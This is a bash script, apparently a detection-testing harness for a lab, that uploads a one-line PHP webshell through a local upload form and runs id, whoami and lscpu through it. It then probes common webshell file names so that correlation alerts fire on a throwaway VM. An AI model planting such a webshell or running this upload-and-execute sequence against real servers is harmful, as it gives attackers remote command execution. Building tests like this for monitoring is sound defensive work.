#!/usr/bin/env bash
# End-to-end scenario for the correlation monitors: drop a webshell through the
# lab's upload form, then use it. Run ON THE VICTIM as root (throwaway VM only).
#
#   sudo ./attack-sequence.sh
#
# Expected, within ~5 minutes on the manager (`w2s.py alerts`):
#   - webshell dropped then executed   (FIM drop, then exec on the same agent)
#   - interactive webshell              (3+ post-exploitation commands by www-data)
#   - one source probing webshell paths (3+ distinct suspicious paths)
#   - first time a web account runs this binary (lscpu has not run before)
# The "webshell" only runs the commands below, all local and read-only.
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "run as root" >&2; exit 1; }
V=http://127.0.0.1
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT

echo "[1] drop: upload lab-shell.php"
printf '<?php system($_GET["cmd"] ?? "id"); ?>\n' > "$T/lab-shell.php"
curl -s -m 5 -F "file=@$T/lab-shell.php" "$V/upload.php" >/dev/null

# Let FIM report the drop first, so the sequence is unambiguous.
sleep 20

echo "[2] use it: discovery through the webshell"
for c in id whoami lscpu; do
  curl -s -m 5 -o /dev/null "$V/uploads/lab-shell.php?cmd=$c"; echo "    cmd=$c"; sleep 3
done

echo "[3] probe other webshell names (404s)"
for p in cmd.php up.php x.php; do
  curl -s -m 5 -o /dev/null "$V/uploads/$p?cmd=id"; echo "    /uploads/$p?cmd=id"
done

rm -f /var/www/html/uploads/lab-shell.php
echo "done"
